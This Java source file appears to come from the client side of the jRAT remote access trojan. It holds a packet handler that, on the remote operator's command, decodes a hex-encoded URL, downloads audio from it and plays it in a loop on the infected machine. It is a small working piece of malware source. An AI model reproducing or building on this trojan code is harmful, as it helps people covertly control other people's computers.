package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.common.codec.Hex;

import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.Clip;
import java.net.URL;


public class Packet44PlaySoundFromURL implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String url = con.readLine();
		int times = con.readInt();
		url = Hex.decode(url.substring(2, url.length()));
		URL u = new URL(url);
		AudioInputStream audioIn = AudioSystem.getAudioInputStream(u);
		Clip clip = AudioSystem.getClip();
		clip.open(audioIn);
		clip.loop(times == 0 ? 0 : times - 1);
	}

}
